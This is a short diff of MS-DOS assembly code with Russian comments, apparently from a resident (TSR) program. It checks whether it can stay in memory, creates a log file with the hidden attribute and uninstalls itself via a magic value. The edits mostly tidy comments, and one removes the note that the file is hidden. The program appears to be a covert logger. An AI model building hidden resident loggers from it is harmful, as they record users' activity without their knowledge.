@@ -192,7 +192,7 @@ int_vectors:
       push  es
       mov   ax,ds:[2Ch]             ;psp
       mov   es,ax
-      mov   ah,49h                  ;хватит памяти чтоб остаться
+      mov   ah,49h                  ;хватит памяти, чтобы остаться
       int   21h                     ;резидентом?
       pop   es
       jc    not_mem                 ;не хватило - выходим
@@ -229,7 +229,7 @@ create_file:
       jnc   close_f                   ;файл есть - закрываем его
 
  create_f: mov ah, 3Ch                 ;создаем файл
-          mov   cx, 02h                 ;аттрибут - скрытый
+          mov   cx, 02h               
           lea   dx, logfile
           int   21h
           mov   handle, ax
@@ -242,8 +242,8 @@ create_file:
 ;сюда попадаем если в командной строке
 ;был указан ключ "-". Выгружаемся из памяти
 remove:
-      cmp   word ptr es:magic,0BABAh;а мы были загружены?
-      jne   not_installed           ;не были - выходим
+      cmp   word ptr es:magic,0BABAh  ;а мы были загружены?
+      jne   not_installed             ;не были - выходим
 
       push  es
       push  ds
